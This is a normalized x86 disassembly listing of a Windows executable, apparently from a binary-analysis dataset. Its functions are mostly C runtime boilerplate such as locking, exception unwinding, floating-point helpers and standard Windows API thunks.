call sub_410ed8
or [ rw-data ] 0xffffffff
pop ecx
sub_41360c
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_4137b5
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_413915
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_4137e7
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_4136a0
add esp 0xc
pop ebp
retn 0x8
sub_4138e9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_413820
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_413934
call eax
retn
sub_413a72
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_424e86
pop ebp
retn
sub_413b61
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_419b3e
sub_413b6c
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_419b8c
sub_4140cb
mov edi edi
push esi
mov esi ecx
push [ esi + 0x404 ]
call sub_41a3a5
and [ esi + 0x404 ] 0x0
pop ecx
pop esi
retn
sub_4143b2
call sub_4143d1
test al al
jne r-xdata
mov al 0x1
retn
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
xor al al
retn
sub_414cae
mov edx [ ecx + 0x20 ]
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x0
push 0x8
call sub_414af0
retn
or edx 0x80
mov [ ecx + 0x20 ] edx
sub_414ccd
push 0x1
push 0x10
mov [ ecx + 0x28 ] 0x8
mov [ ecx + 0x2c ] 0xa
call sub_414af0
retn
sub_414d58
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ ecx + 0x1c ] 0x7
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
xor al al
retn
sub_414f74
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0xe06d7363
sete al
pop ebp
retn
sub_415086
mov esp [ ebp - 0x18 ]
call sub_4190e7
sub_415091
push 0x2
call sub_41920b
pop ecx
retn
sub_41518f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41519e
push 0x1
push 0x2
push 0x0
call sub_414f87
add esp 0xc
retn
sub_4151ad
push 0x1
push 0x0
push 0x0
call sub_414f87
add esp 0xc
retn
sub_4151bc
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x2
push [ ebp + 0x8 ]
call sub_414f87
add esp 0xc
pop ebp
retn
sub_41520a
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_414f87
add esp 0xc
pop ebp
retn
j_sub_41a3a5#2
jmp sub_41a3a5
sub_4153e5
push [ ebp - 0x20 ]
call sub_416caf
pop ecx
retn
sub_415514
push esi
call sub_416caf
pop ecx
retn
sub_415673
push esi
call sub_416caf
pop ecx
retn
sub_41602a
cmp [ ecx ] 0x0
jne r-xdata
mov al 0x1
retn
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
xor al al
retn
sub_416225
push 0x1
call sub_41622e
pop ecx
retn
sub_4162d3
push [ ebp - 0x28 ]
call sub_416caf
pop ecx
retn
sub_4162fd
push 0x8
call sub_41920b
pop ecx
retn
sub_416357
push esi
call sub_416caf
pop ecx
retn
sub_4163a4
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_416caf
pop ecx
retn
sub_416654
push [ ebp + 0x8 ]
call sub_416caf
pop ecx
retn
sub_416810
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4165d7
add esp 0x10
pop ebp
retn
sub_4168e6
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_416caf
pop ecx
retn
sub_416caf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_416daf
push [ ebp - 0x20 ]
call sub_416caf
pop ecx
retn
sub_416f6a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_424e86
pop ebp
retn
sub_41700b
push 0x0
call sub_41920b
pop ecx
retn
sub_417481
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_417187
sub_4176f1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
pop ebp
retn
push eax
call sub_417609
pop ecx
sub_41770c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
pop ebp
retn
push eax
call sub_417609
pop ecx
j_sub_41748c
jmp sub_41748c
sub_417763
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
call sub_41748c
mov [ rw-data ] eax
j_sub_4174bb
jmp sub_4174bb
sub_4177c1
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_41920b
pop ecx
retn
sub_417812
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_41920b
pop ecx
retn
sub_417acf
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push rw-data
call sub_417b3f
pop ecx
pop ecx
pop ebp
retn
sub_417b63
push rw-data
mov ecx rw-data
call sub_424e86
mov al 0x1
retn
sub_417b75
push rw-data
call sub_417b02
mov [ esp ] rw-data
call sub_417b02
pop ecx
mov al 0x1
retn
sub_417b8f
call sub_41772c
mov al 0x1
retn
sub_417bd4
push 0x0
call sub_410a97
pop ecx
retn
sub_417c54
push r--data
push r--data
call sub_41f266
pop ecx
pop ecx
retn
sub_417c66
push r--data
push r--data
call sub_41f2e9
pop ecx
pop ecx
retn
sub_417c78
mov eax [ rw-data ]
retn
sub_417c7e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_417cac
mov eax [ rw-data ]
mov ecx eax
xor eax [ rw-data ]
and ecx 0x1f
ror eax cl
neg eax
sbb eax eax
neg eax
retn
sub_417cc5
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_424e86
pop ebp
retn
sub_417d22
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_417c8d
pop ecx
mov [ rw-data ] eax
pop ebp
retn
sub_417f12
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call [ GetCommandLineW@IAT ]
mov [ rw-data ] eax
mov al 0x1
retn
sub_417f2b
mov eax rw-data
retn
sub_417f31
mov eax rw-data
retn
sub_417f37
push 0x8
push r--data
call sub_40e2a0
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_417fdd
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417f63
call sub_40e2e6
retn 0xc
sub_417f63
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
mov eax [ eax ]
and [ eax + 0x350 ] 0xffffffef
retn
sub_417fa9
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_41920b
pop ecx
retn
sub_41819d
xor eax eax
mov ecx rw-data
inc eax
xchg [ ecx ] eax
retn
sub_4181f1
push 0x4
call sub_41920b
pop ecx
retn
sub_4190ac
mov eax [ rw-data ]
retn
sub_4190e1
mov eax rw-data
retn
sub_41910f
xor eax eax
inc eax
retn
sub_4191c3
mov edi edi
push ebp
mov ebp esp
imul eax [ ebp + 0x8 ] 0x18
add eax rw-data
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_41920b
mov edi edi
push ebp
mov ebp esp
imul eax [ ebp + 0x8 ] 0x18
add eax rw-data
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_419222
push 0x4
call sub_4191c3
pop ecx
retn
sub_419425
push 0x4
call sub_41920b
pop ecx
retn
sub_419ad9
test esi esi
jne r-xdata
push [ ebp - 0x1c ]
call sub_416caf
pop ecx
retn
push [ ebp - 0x1c ]
call sub_41dd1f
pop ecx
sub_419af0
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_419a2f
sub_41a765
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_41920b
pop ecx
retn
sub_41a7c6
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_41920b
pop ecx
retn
sub_41a811
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_41920b
pop ecx
retn
sub_41a859
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_41920b
pop ecx
retn
sub_41abc8
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov al 0x1
retn
push eax
call sub_41bf8e
or [ rw-data ] 0xffffffff
sub_41ae43
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41ad22
add esp 0x14
pop ebp
retn
sub_41b8f5
mov ecx [ rw-data ]
xor eax eax
or ecx 0x1
cmp [ rw-data ] ecx
sete al
retn
sub_41bbb1
push 0x7
call sub_41920b
pop ecx
retn
sub_41bca4
mov ecx [ ebp + 0x10 ]
push [ ecx ]
call sub_41920b
pop ecx
retn
sub_41bcd8
push r--data
push r--data
push r--data
push 0x1
call sub_41bcf2
add esp 0x10
retn
sub_41c377
call sub_41bcd8
neg eax
sbb eax eax
neg eax
retn
sub_41c5e7
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_41c466
sub_41c7cf
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_41c5f2
sub_41c9f4
mov ecx [ ebp + 0x10 ]
push [ ecx ]
call sub_41f9d0
pop ecx
retn
sub_41d0e9
push esi
call sub_41f9d0
pop ecx
retn
sub_41d3ce
push [ ebp + 0x8 ]
call sub_416caf
pop ecx
retn
sub_41d88c
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_41d35c
sub_41d897
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_41d3d8
sub_41d97a
push edi
call sub_41f9d0
pop ecx
retn
sub_41da25
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41d8a2
add esp 0x10
pop ebp
retn
sub_41daf2
push 0x8
call sub_41920b
pop ecx
retn
sub_41db71
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_41f9d0
pop ecx
retn
sub_41dd16
push 0x8
call sub_41920b
pop ecx
retn
sub_41e5d8
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_41e0d6
sub_41e61a
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_41920b
pop ecx
retn
sub_41eabd
cmp [ rw-data ] 0x0
jne r-xdata
mov al 0x1
retn
push 0x1
push 0xfffffffd
call sub_41e9bc
pop ecx
pop ecx
mov [ rw-data ] 0x1
sub_41eb6c
push 0x5
call sub_41920b
pop ecx
retn
sub_41f1c8
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_41ee76
sub_41f1d3
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_41f1de
sub_41f24b
call [ GetProcessHeap@IAT ]
test eax eax
mov [ rw-data ] eax
setne al
retn
sub_41f25c
and [ rw-data ] 0x0
mov al 0x1
retn
sub_41f384
mov ecx [ ebp + 0x10 ]
push [ ecx ]
call sub_41920b
pop ecx
retn
sub_41f63d
cmp [ ebp - 0x1d ] 0x0
je r-xdata
retn
push 0x3
call sub_41920b
pop ecx
sub_41f910
push 0x7
call sub_41920b
pop ecx
retn
sub_41fafc
push 0x7
call sub_41920b
pop ecx
retn
sub_420c77
push 0x4
call sub_41920b
pop ecx
retn
sub_42305a
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_422ee2
sub_4238bc
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
cmp [ eax ] 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp [ eax ] 0xc000001d
je r-xdata
xor eax eax
retn
sub_423903
mov edi edi
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_42399d
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_423a53
push 0xa
call IsProcessorFeaturePresent
mov [ rw-data ] eax
xor eax eax
retn
sub_423a70
push ebp
mov ebp esp
sub esp 0x10
and esp 0xfffffff0
fxch st1
fstp [ esp ]
fstp [ esp + 0x8 ]
call sub_423a89
leave
retn
j_sub_4248a8
jmp sub_4248a8
sub_4245f8
fstp st0
fstp st0
fld [ r--data ]
mov [ ebp - 0x90 ] 0x2
retn
sub_424624
mov [ ebp - 0x90 ] 0x2
fstp st0
fld [ r--data ]
retn
sub_424634
or cl cl
jne r-xdata
jmp r-xdata
retn
fstp st0
fld [ r--data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
sub_424639
fldlg2
jmp r-xdata
fxch st1
or cl cl
jne r-xdata
jmp sub_424943
fyl2x
retn
sub_42463d
fldln2
fxch st1
or cl cl
jne r-xdata
jmp sub_424943
fyl2x
retn
j_sub_4248a8#2
jmp sub_4248a8
sub_424689
fstp st0
jmp r-xdata
fstp st0
fld [ r--data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
sub_4246bf
fstp st0
fstp st0
fld [ r--data ]
mov [ ebp - 0x90 ] 0x3
retn
sub_4246d1
or cl cl
jne r-xdata
jmp sub_424896
fstp st0
fld [ r--data ]
retn
sub_424888
fxch st1
fstp st0
retn
sub_424896
fstp st0
fldz
retn
sub_42489b
fstp st0
fstp st0
fldz
test ch ch
je r-xdata
retn
fchs
sub_4248a8
fstp st0
fstp st0
fld1
retn
sub_4248af
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x0
fadd [ r--data ]
retn
mov [ ebp - 0x90 ] 0x0
retn
sub_4248da
fxch st1
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x0
mov [ ebp - 0x90 ] 0x0
jmp r-xdata
faddp st1
retn
sub_424943
fstp st0
fstp st0
fld [ r--data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
sub_424956
mov [ ebp - 0x90 ] 0x1
or cl cl
retn
sub_424960
fstp st0
fstp st0
fld [ r--data ]
or ch ch
je r-xdata
or cl cl
je r-xdata
fchs
retn
fld [ r--data ]
fmulp st1
sub_42497d
or cl cl
je r-xdata
retn
fchs
sub_4249f0
fld st0
frndint
fsubr st1
fxch st1
fchs
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_424a05
mov edx [ esp + 0x4 ]
and edx 0x300
or edx 0x7f
mov [ esp + 0x6 ] dx
fldcw [ esp + 0x6 ]
retn
sub_424a1c
test eax 0x80000
je r-xdata
fadd [ r--data ]
mov eax 0x0
retn
mov eax 0x0
retn
sub_424a78
mov eax [ esp + 0x8 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ esp + 0x8 ]
retn
retn
sub_424eb7
push 0x7080
mov ecx rw-data
call sub_424e86
push 0x1
mov ecx rw-data
call sub_424e86
push 0xfffff1f0
mov ecx rw-data
call sub_424e86
mov [ rw-data ] rw-data
xor eax eax
retn
sub_426b2a
push esi
call sub_41f9d0
pop ecx
retn
sub_42747b
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4273ca
sub_4274d0
call sub_41eabd
xor ecx ecx
test al al
sete cl
mov eax ecx
retn
sub_428c32
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fld [ ebp + 0x8 ]
frndint
fstp [ ebp - 0x8 ]
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_42903d
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_42905c
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_4293e0
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff0
fstp [ esp ]
movq xmm0 [ esp ]
call sub_4293fe
leave
retn
sub_4293f8
movlpd xmm0 [ esp + 0x4 ]
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
SystemFunction036
jmp [ SystemFunction036@IAT ]
sub_42973c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx

sub_4297c0
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_429c10
sub_4297d6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_429c10
sub_429979
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_429ad9
mov ecx [ ebp - 0x1c ]
xor ecx ebp
sub_40d56a
sub_40e2e6
sub_42a420
xorps xmm1 xmm1
cvtsi2sd xmm1 edx
xorps xmm0 xmm0
cvtsi2sd xmm0 ecx
shr ecx 0x1f
mulsd xmm1 [ r--data ]
addsd xmm0 [ ecx * 8 + r--data ]
addsd xmm0 xmm1
retn
sub_42a450
mov ecx [ ebp - 0x10 ]
jmp sub_4024b0
sub_42a458
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a480
lea ecx [ ebp - 0x100 ]
jmp sub_4067b0
sub_42a48b
lea ecx [ ebp - 0x78 ]
jmp sub_404250
sub_42a493
lea ecx [ ebp - 0xe0 ]
jmp sub_404250
sub_42a49e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x104 ]
xor ecx eax
call sub_40d56a
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a4d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a4f0
mov ecx [ ebp - 0x10 ]
jmp sub_40e5d0
sub_42a4f8
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_409c30
sub_42a503
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_409c30
sub_42a50e
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_409c30
sub_42a519
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_409c30
sub_42a524
mov ecx [ ebp - 0x10 ]
add ecx 0x24
jmp sub_409c30
sub_42a52f
mov ecx [ ebp - 0x10 ]
add ecx 0x2c
jmp sub_409c30
sub_42a53a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a560
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a580
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a5a0
push 0x18
mov eax [ ebp + 0x8 ]
push eax
call sub_40d57b
add esp 0x8
retn
sub_42a5af
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a5d0
lea ecx [ ebp + 0x10 ]
jmp sub_4067b0
sub_42a5d8
lea ecx [ ebp - 0x28 ]
jmp sub_4067b0
sub_42a5e0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_40d56a
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a610
lea ecx [ ebp - 0x2c ]
jmp sub_4067b0
sub_42a618
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_40d56a
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a640
call j_sub_4190e7
sub_42a646
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a670
call j_sub_4190e7
sub_42a676
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a6a0
call j_sub_4190e7
sub_42a6a6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a6d0
lea ecx [ ebp + 0x8 ]
jmp sub_409c50
sub_42a6d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a700
lea ecx [ ebp + 0x8 ]
jmp sub_409c50
sub_42a708
lea ecx [ ebp - 0x40 ]
jmp sub_4067b0
sub_42a710
lea ecx [ ebp - 0x28 ]
jmp sub_4067b0
sub_42a718
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_40d56a
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a740
lea ecx [ ebp - 0x7c ]
jmp sub_404250
sub_42a748
lea ecx [ ebp - 0x94 ]
jmp sub_409c50
sub_42a753
lea ecx [ ebp - 0xac ]
jmp sub_4067b0
sub_42a75e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xe0 ]
xor ecx eax
call sub_40d56a
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a790
lea ecx [ ebp - 0x4f4 ]
jmp sub_404250
sub_42a79b
lea ecx [ ebp - 0x42c ]
jmp sub_409c50
sub_42a7a6
lea ecx [ ebp - 0x45c ]
jmp sub_409c50
sub_42a7b1
lea ecx [ ebp - 0x474 ]
jmp sub_409c50
sub_42a7bc
lea ecx [ ebp - 0x48c ]
jmp sub_409c50
sub_42a7c7
call j_sub_4190e7
sub_42a84d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x620 ]
xor ecx eax
call sub_40d56a
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a880
call j_sub_4190e7
sub_42a886
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a8b0
lea ecx [ ebp + 0x24 ]
jmp sub_4067b0
sub_42a8b8
lea ecx [ ebp + 0xc ]
jmp sub_4067b0
sub_42a8c0
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
mov ecx [ ebp - 0x34 ]
jmp sub_4067b0
sub_42a8d9
call j_sub_4190e7
sub_42a8e5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_40d56a
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a910
lea ecx [ ebp - 0x140 ]
jmp sub_4067b0
sub_42a91b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14c ]
xor ecx eax
call sub_40d56a
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a950
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
add ecx 0x70
jmp sub_40ac40
sub_42a96c
mov ecx [ ebp - 0x14 ]
add ecx 0x18
jmp sub_40a900
sub_42a977
mov ecx [ ebp - 0x14 ]
add ecx 0x10
jmp sub_40a850
sub_42a982
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a9a0
lea ecx [ ebp - 0x28 ]
jmp sub_4067b0
sub_42a9a8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_40d56a
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42a9d0
lea ecx [ ebp - 0x28 ]
jmp sub_4067b0
sub_42a9d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_40d56a
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42aa00
call j_sub_4190e7
sub_42aa06
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42aa30
lea ecx [ ebp - 0x28 ]
jmp sub_4067b0
sub_42aa38
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_40d56a
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42aa60
lea ecx [ ebp - 0x18 ]
jmp sub_407b40
sub_42aa68
call j_sub_4190e7
sub_42aa6e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42aa90
lea ecx [ ebp - 0x14 ]
jmp sub_407b40
sub_42aa98
call j_sub_4190e7
sub_42aa9e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42aac0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42aae0
lea ecx [ ebp - 0x1c ]
jmp sub_40e5d0
sub_42aae8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42ab10
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_4067b0
sub_42ab29
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42ab50
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_409c50
sub_42ab69
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42ab90
lea ecx [ ebp - 0x18 ]
jmp sub_407b40
sub_42ab98
call j_sub_4190e7
sub_42ab9e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42abc0
lea ecx [ ebp - 0x18 ]
jmp sub_40e5d0
sub_42abc8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42abf0
push 0x8
mov eax [ ebp + 0x8 ]
push eax
call sub_40d57b
add esp 0x8
retn
sub_42abff
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_40d56a
mov eax r--data
jmp sub_411766
sub_42ac20
lea ecx [ ebp - 0x2c ]
jmp sub_40d1f0
sub_42ac28
lea ecx [ ebp - 0x2c ]
jmp sub_40d1a0
sub_42ac30
call j_sub_4190e7
sub_42ac36
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_40d56a
